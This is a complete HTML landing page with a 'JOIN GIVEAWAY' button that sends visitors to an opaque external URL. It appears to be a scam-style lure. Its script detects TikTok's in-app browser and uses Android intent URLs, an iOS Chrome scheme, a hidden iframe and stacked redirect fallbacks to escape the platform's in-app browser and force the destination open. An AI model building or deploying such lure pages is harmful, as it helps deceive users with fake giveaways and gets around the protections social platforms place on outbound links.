<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Join Giveaway</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #ffffff; /* White background */
      font-family: Arial, sans-serif;
    }

    .btn {
      background: linear-gradient(135deg, #d4af37, #f5d76e); /* Golden gradient */
      border: none;
      border-radius: 12px;
      padding: 20px 50px;
      font-size: 28px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
      text-decoration: none;
      text-align: center;
    }

    .btn:hover {
      background: linear-gradient(135deg, #f5d76e, #d4af37); /* Reverse gradient for hover */
      transform: translateY(-3px);
      box-shadow: 0 12px 25px rgba(0,0,0,0.35);
    }
  </style>
</head>
<body>
  <a href="https://passwordomain.com/1838319" class="btn" onclick="handleRedirect(event)">JOIN GIVEAWAY</a>
  <script>
    // Target URL
    const targetUrl = 'https://passwordomain.com/1838319';

    // Function to detect user agent and environment
    function getEnvironment() {
      const ua = navigator.userAgent.toLowerCase();
      const isAndroid = ua.includes('android');
      const isIOS = /iphone|ipad|ipod/.test(ua);
      const isTikTok = ua.includes('tiktok') || ua.includes('musical_ly');
      console.log('User Agent:', ua); // Debug: Log user agent
      console.log('Is Android:', isAndroid, 'Is iOS:', isIOS, 'Is TikTok:', isTikTok);
      return { isAndroid, isIOS, isTikTok };
    }

    // Function to attempt redirect with multiple methods
    function attemptRedirect(url) {
      console.log('Attempting redirect to:', url); // Debug: Log redirect attempt
      // Method 1: Direct window.location.href
      try {
        window.location.href = url;
        console.log('Method 1: window.location.href attempted');
      } catch (e) {
        console.error('Method 1 failed:', e.message);
      }

      // Method 2: window.location.assign
      try {
        window.location.assign(url);
        console.log('Method 2: window.location.assign attempted');
      } catch (e) {
        console.error('Method 2 failed:', e.message);
      }

      // Method 3: Create hidden iframe (bypasses some in-app restrictions)
      try {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        document.body.appendChild(iframe);
        console.log('Method 3: iframe redirect attempted');
      } catch (e) {
        console.error('Method 3 failed:', e.message);
      }
    }

    // Main redirect handler
    function handleRedirect(event) {
      event.preventDefault(); // Prevent default <a> behavior
      console.log('Button clicked, initiating redirect'); // Debug: Log click

      const env = getEnvironment();
      let redirectUrl = targetUrl;

      // TikTok in-app browser bypass attempts
      if (env.isTikTok) {
        console.log('Detected TikTok in-app browser');
        // Android: Try intent URL to open external browser
        if (env.isAndroid) {
          const intentUrl = `intent://${targetUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
          console.log('Trying Android intent URL:', intentUrl);
          attemptRedirect(intentUrl);
          // Fallback after 1 second
          setTimeout(() => {
            console.log('Falling back to direct URL for Android');
            attemptRedirect(targetUrl);
          }, 1000);
        }
        // iOS: Try googlechromes scheme
        else if (env.isIOS) {
          const iosUrl = `googlechromes://${targetUrl.replace('https://', '')}`;
          console.log('Trying iOS Chrome scheme:', iosUrl);
          attemptRedirect(iosUrl);
          // Fallback after 1 second
          setTimeout(() => {
            console.log('Falling back to direct URL for iOS');
            attemptRedirect(targetUrl);
          }, 1000);
        }
      } else {
        // Standard browser redirect
        console.log('Detected standard browser, using direct redirect');
        attemptRedirect(targetUrl);
      }

      // Ultimate fallback: Open in new tab after 2 seconds
      setTimeout(() => {
        console.log('Attempting final fallback: window.open');
        try {
          window.open(targetUrl, '_blank');
          console.log('window.open attempted');
        } catch (e) {
          console.error('window.open failed:', e.message);
        }
      }, 2000);
    }
  </script>
</body>
</html>
